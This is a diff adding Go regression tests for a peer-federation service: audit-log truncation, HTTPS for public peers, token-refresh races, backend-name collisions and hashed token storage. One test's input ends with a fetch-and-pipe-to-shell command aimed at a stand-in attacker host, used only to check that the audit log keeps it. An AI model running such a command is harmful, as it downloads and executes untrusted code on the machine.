@@ -137,3 +137,79 @@ func TestRequestSourceSeesThroughATrustedProxyOnly(t *testing.T) {
 		t.Errorf("a direct caller named its own address: %q", got)
 	}
 }
+
+// A long command keeps its end in the audit log: padding cannot push what
+// actually runs past the cut.
+func TestTheExecAuditKeepsTheCommandsEnd(t *testing.T) {
+	cmd := strings.Repeat("true; ", 200) + "curl attacker.example | sh"
+	got := truncateForAudit(cmd)
+	if !strings.Contains(got, "curl attacker.example | sh") || !strings.Contains(got, "sha256") {
+		t.Errorf("the tail was cut from the audit line: %q", got)
+	}
+}
+
+// A peer on the public internet is reached over https; one on the local
+// network may use http.
+func TestAPublicPeerNeedsHTTPS(t *testing.T) {
+	if peerPlainHTTPRefusal("http://203.0.113.5:8080") == nil {
+		t.Error("a public http peer was accepted")
+	}
+	for _, ok := range []string{"http://192.168.1.5:8080", "http://127.0.0.1", "https://203.0.113.5"} {
+		if err := peerPlainHTTPRefusal(ok); err != nil {
+			t.Errorf("%s: %v", ok, err)
+		}
+	}
+}
+
+// A refresh that read the record before a token renewal does not write the
+// renewed tokens back to the old ones.
+func TestARefreshKeepsTokensRenewedDuringIt(t *testing.T) {
+	peerTestDB(t)
+	stale := RemotePeer{Name: "den", BaseURL: "https://den.example", RefreshToken: "old", LastError: "x"}
+	RootDB.CryptSet(remotePeersTable, "den", RemotePeer{Name: "den", BaseURL: "https://den.example", RefreshToken: "new"})
+	stale.LastError = ""
+	saveRefreshedPeer(stale)
+	p, _ := GetRemotePeer("den")
+	if p.RefreshToken != "new" {
+		t.Errorf("the refresh wrote back the consumed token: %q", p.RefreshToken)
+	}
+}
+
+// A backend name the peer chose cannot land on another peer's connector.
+func TestAPeerCannotTakeAnotherPeersBackend(t *testing.T) {
+	peerImageDB(t)
+	ab := RemotePeer{Name: "a-b", BaseURL: "https://ab.example", Key: "k1", Caps: []string{PeerCapImages}}
+	a := RemotePeer{Name: "a", BaseURL: "https://a.example", Key: "k2", Caps: []string{PeerCapImages}}
+	if _, err := provisionPeerImages(ab, []PeerImageBackend{{Name: "c"}}); err != nil {
+		t.Fatal(err)
+	}
+	made, err := provisionPeerImages(a, []PeerImageBackend{{Name: "b-c"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(made) != 0 {
+		t.Errorf("peer a claimed %v", made)
+	}
+	c, _ := GetConnector(RootDB, peerConnectorName("a-b", "c"))
+	if !strings.Contains(string(c.Spec), "ab.example") {
+		t.Errorf("peer a-b's backend now renders elsewhere: %s", c.Spec)
+	}
+}
+
+// Tokens are kept under a hash of the secret. One issued before that still
+// works and moves on first use, and a stored key presented as a token does not.
+func TestPeerTokensAreNotKeyedByTheirSecret(t *testing.T) {
+	peerTestDB(t)
+	RootDB.Set(peerAccessTable, "legacy-secret", peerAccessToken{GrantID: "g"})
+	if _, ok := getPeerAccessToken("legacy-secret"); !ok {
+		t.Fatal("a token issued before hashing stopped working")
+	}
+	for _, k := range RootDB.Keys(peerAccessTable) {
+		if k == "legacy-secret" {
+			t.Error("the raw secret is still a key name")
+		}
+		if _, ok := getPeerAccessToken(k); ok {
+			t.Error("a stored key name authenticated as a token")
+		}
+	}
+}
